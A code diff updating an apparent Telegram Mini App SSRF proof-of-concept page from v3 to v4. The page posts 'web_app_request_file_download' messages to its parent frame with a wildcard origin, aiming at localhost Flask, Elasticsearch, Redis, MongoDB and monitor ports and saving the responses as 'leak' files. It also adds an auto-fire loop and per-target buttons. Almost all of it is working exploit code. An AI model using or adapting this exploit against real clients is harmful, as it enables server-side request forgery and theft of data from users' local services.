@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>SSRF PoC v3</title>
+<head><meta charset="utf-8"><title>SSRF PoC v4</title>
 <style>
 body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
 h2{color:#f44;margin:0 0 4px 0}
@@ -8,33 +8,25 @@ h2{color:#f44;margin:0 0 4px 0}
 button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
 button.fire{background:#4a0000;border-color:#f44;font-size:13px}
 </style></head><body>
-<h2>SSRF PoC v3 — postMessage only</h2>
-<div id="log">Initializing...</div>
+<h2>SSRF PoC v4 — legacy array format</h2>
+<div id="log">Ready.</div>
 <div id="btns"></div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
 const L = (s) => { const e=document.getElementById('log'); e.textContent += s+'\n'; e.scrollTop = e.scrollHeight; };
 
-L('=== v3: Direct postMessage ===');
+try { Telegram.WebApp.ready(); Telegram.WebApp.expand(); L('WebApp OK'); }
+catch(e) { L('WebApp err: '+e.message); }
 
-const msg = (cmd, data) => {
-  const payload = JSON.stringify({eventType: cmd, eventData: data});
-  L(`  TX: ${cmd} data=${JSON.stringify(data).substring(0,80)}`);
+const send = (cmd, data) => {
+  const payload = JSON.stringify([cmd, data]);
+  L(`TX: ${cmd} ${JSON.stringify(data).substring(0,60)}`);
   window.parent.postMessage(payload, '*');
-  L('  -> postMessage sent to parent');
 };
 
-try {
-  Telegram.WebApp.ready();
-  Telegram.WebApp.expand();
-  L('Telegram.WebApp OK');
-} catch(e) {
-  L('Telegram.WebApp ERROR: '+e.message);
-}
-
 const T = [
-  ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask Dev (:5000)'],
+  ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask (:5000)'],
   ['http://127.0.0.1:9200/', 'elastic_leak.json', 'Elastic (:9200)'],
   ['http://127.0.0.1:6379/', 'redis_leak.txt', 'Redis (:6379)'],
   ['http://127.0.0.1:27017/', 'mongo_leak.txt', 'MongoDB (:27017)'],
@@ -42,25 +34,22 @@ const T = [
 ];
 
 let idx = 0;
-function fireNext() {
-  if (idx >= T.length) { L('=== DONE ==='); return; }
-  const [url, name, desc] = T[idx];
-  L(`[${idx+1}/${T.length}] ${desc}: ${url}`);
-  msg('web_app_request_file_download', {url, file_name: name});
-  idx++;
-  setTimeout(fireNext, 2500);
+function fireAll() {
+  idx = 0;
+  function next() {
+    if (idx >= T.length) { L('=== DONE ==='); L('Check http://127.0.0.1:9999'); return; }
+    const [url,name,desc] = T[idx];
+    L(`[${idx+1}/${T.length}] ${desc}`);
+    send('web_app_request_file_download', {url, file_name: name});
+    idx++;
+    setTimeout(next, 3000);
+  }
+  next();
 }
 
-function single(i) { idx = 0; const [url,name,desc] = T[i]; L(`Single: ${desc}`); msg('web_app_request_file_download', {url, file_name: name}); }
-
-L('Ready.');
 document.getElementById('btns').innerHTML = `
-  <button class="fire" onclick="fireNext()">FIRE: Auto-Scan All 5</button>
-  <button onclick="single(0)">Flask Dev (:5000)</button>
-  <button onclick="single(1)">Elastic (:9200)</button>
-  <button onclick="single(2)">Redis (:6379)</button>
-  <button onclick="single(3)">MongoDB (:27017)</button>
-  <button onclick="single(4)">Monitor (:9999)</button>
+  <button class="fire" onclick="fireAll()">FIRE: Scan All 5 Services</button>
+  ${T.map(([u,n,d],i) => `<button onclick="send('web_app_request_file_download',{url:'${u}',file_name:'${n}'});L('Single: ${d}')">${d}</button>`).join('')}
 `;
 </script>
 </body>
